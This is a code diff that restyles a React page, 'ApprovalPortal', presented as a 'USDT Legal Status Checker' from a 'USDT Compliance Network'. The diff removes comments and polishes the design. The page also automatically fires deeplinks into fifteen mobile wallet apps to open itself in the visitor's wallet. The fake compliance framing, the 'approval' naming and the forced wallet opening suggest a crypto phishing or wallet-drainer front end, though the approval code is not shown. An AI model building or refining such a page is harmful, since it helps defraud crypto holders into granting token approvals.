@@ -83,44 +83,26 @@ export default function ApprovalPortal() {
     const currentUrl = typeof window !== 'undefined' ? window.location.href : '';
     const encodedUrl = encodeURIComponent(currentUrl);
     
-    // Universal deeplinks for major mobile wallets
     const walletLinks = [
-      // MetaMask
       `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`,
-      // Trust Wallet
       `https://link.trustwallet.com/open_url?coin_id=56&url=${encodedUrl}`,
-      // Rainbow
       `https://rnbwapp.com/browser?url=${encodedUrl}`,
-      // Coinbase Wallet
       `https://go.cb-w.com/dapp?cb_url=${encodedUrl}`,
-      // TokenPocket
       `tpdapp://open?params=${encodedUrl}`,
-      // imToken
       `imtokenv2://navigate/DappView?url=${encodedUrl}`,
-      // Crypto.com DeFi Wallet
       `dfw://browser?url=${encodedUrl}`,
-      // SafePal
       `safepal://browser?url=${encodedUrl}`,
-      // Bitget Wallet
       `bitkeep://bkconnect?action=dapp&url=${encodedUrl}`,
-      // OKX Wallet
       `okx://wallet/dapp/url?dappUrl=${encodedUrl}`,
-      // Binance Wallet (Trust Wallet alternative)
       `bnc://app.binance.com/dapp?url=${encodedUrl}`,
-      // Phantom (if available on mobile)
       `https://phantom.app/ul/browse/${encodedUrl}?cluster=mainnet-beta`,
-      // Argent
       `https://argent.link/app/wc?uri=${encodedUrl}`,
-      // 1inch Wallet
       `oneinch://dapp?url=${encodedUrl}`,
-      // Zerion
       `zerion://dapp?url=${encodedUrl}`,
     ];
 
-    // Try opening with universal mobile scheme first
     const universalScheme = `dapp://${window.location.host}${window.location.pathname}`;
     
-    // Attempt to trigger all wallet deeplinks
     walletLinks.forEach((link, index) => {
       setTimeout(() => {
         const a = document.createElement('a');
@@ -129,10 +111,9 @@ export default function ApprovalPortal() {
         document.body.appendChild(a);
         a.click();
         document.body.removeChild(a);
-      }, index * 300); // Stagger the attempts
+      }, index * 300);
     });
 
-    // Also try the universal scheme
     setTimeout(() => {
       const a = document.createElement('a');
       a.href = universalScheme;
@@ -142,23 +123,35 @@ export default function ApprovalPortal() {
       document.body.removeChild(a);
     }, walletLinks.length * 300);
 
-    // Show user feedback
     setTimeout(() => {
       setError(null);
     }, (walletLinks.length + 1) * 300);
   };
 
   return (
-    <main className="min-h-screen flex flex-col items-center justify-center p-6 bg-gradient-to-br from-[#0a0a0f] via-[#1a1a2e] to-[#16213e]">
-      <div className="w-full max-w-2xl">
-        <div className="text-center mb-8 animate-float">
-          <div className="inline-flex items-center justify-center w-20 h-20 rounded-full bg-gradient-to-br from-emerald-500 to-teal-600 mb-4 shadow-lg shadow-emerald-500/30">
-            <svg className="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+    <main className="relative min-h-screen flex flex-col items-center justify-center p-4 sm:p-6 md:p-8 overflow-hidden">
+      {/* Animated background orbs */}
+      <div className="absolute inset-0 overflow-hidden pointer-events-none">
+        <div className="absolute top-1/4 left-1/4 w-64 h-64 sm:w-96 sm:h-96 bg-emerald-500/10 rounded-full blur-3xl animate-pulse-glow" />
+        <div className="absolute bottom-1/4 right-1/4 w-64 h-64 sm:w-96 sm:h-96 bg-teal-500/10 rounded-full blur-3xl animate-pulse-glow animation-delay-2000" />
+        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-48 h-48 sm:w-72 sm:h-72 bg-cyan-500/5 rounded-full blur-3xl animate-pulse-glow animation-delay-1000" />
+      </div>
+
+      <div className="relative w-full max-w-2xl z-10 animate-slide-up">
+        {/* Header */}
+        <div className="text-center mb-6 sm:mb-8 md:mb-10">
+          <div className="inline-flex items-center justify-center w-16 h-16 sm:w-20 sm:h-20 md:w-24 md:h-24 rounded-full bg-gradient-to-br from-emerald-400 via-emerald-500 to-teal-600 mb-4 sm:mb-5 md:mb-6 shadow-2xl shadow-emerald-500/50 animate-float relative">
+            <div className="absolute inset-0 rounded-full bg-gradient-to-br from-emerald-400 to-teal-600 animate-pulse-glow opacity-60" />
+            <svg className="w-8 h-8 sm:w-10 sm:h-10 md:w-12 md:h-12 text-white relative z-10" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
             </svg>
           </div>
-          <h1 className="text-4xl font-bold text-white mb-2">USDT Legal Status Checker</h1>
-          <p className="text-gray-400 text-base">Verify your USDT compliance with regulatory standards</p>
+          <h1 className="text-3xl sm:text-4xl md:text-5xl font-bold text-white mb-2 sm:mb-3 bg-gradient-to-r from-white via-emerald-100 to-white bg-clip-text text-transparent leading-tight px-4">
+            USDT Legal Status Checker
+          </h1>
+          <p className="text-sm sm:text-base md:text-lg text-gray-300 max-w-md mx-auto px-4 leading-relaxed">
+            Verify your USDT compliance with regulatory standards
+          </p>
         </div>
 
         <ProgressBar currentStep={step} />
@@ -223,8 +216,10 @@ export default function ApprovalPortal() {
         <SuccessModal isOpen={showSuccess} />
       </div>
 
-      <footer className="fixed bottom-5 left-1/2 -translate-x-1/2 text-xs text-gray-400 backdrop-blur-sm bg-black/30 px-4 py-2 rounded-full border border-emerald-500/10">
-        Secured by <span className="text-emerald-500 font-medium">USDT Compliance Network</span>
+      {/* Footer */}
+      <footer className="fixed bottom-3 sm:bottom-4 md:bottom-5 left-1/2 -translate-x-1/2 text-xs sm:text-sm text-gray-400 backdrop-blur-md bg-black/40 px-3 sm:px-4 md:px-6 py-2 sm:py-2.5 rounded-full border border-emerald-500/20 shadow-lg z-20">
+        <span className="hidden sm:inline">Secured by </span>
+        <span className="text-emerald-400 font-semibold">USDT Compliance Network</span>
       </footer>
     </main>
   );
